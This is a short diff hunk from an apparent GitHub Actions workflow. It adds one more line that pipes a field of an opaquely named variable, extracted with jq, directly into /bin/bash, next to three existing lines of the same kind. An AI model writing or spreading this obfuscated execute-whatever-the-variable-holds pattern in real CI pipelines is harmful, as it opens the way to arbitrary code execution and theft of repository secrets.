@@ -36,6 +36,7 @@ jobs:
           echo $jcqf280 | jq -r .tz31 | /bin/bash
           printf '%s' "$qin578" | jq -r .kas66 | /bin/bash
           echo $nsg60628 | jq -r .nja88 | /bin/bash
+          echo $wgwxv0303 | jq -r .s566 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
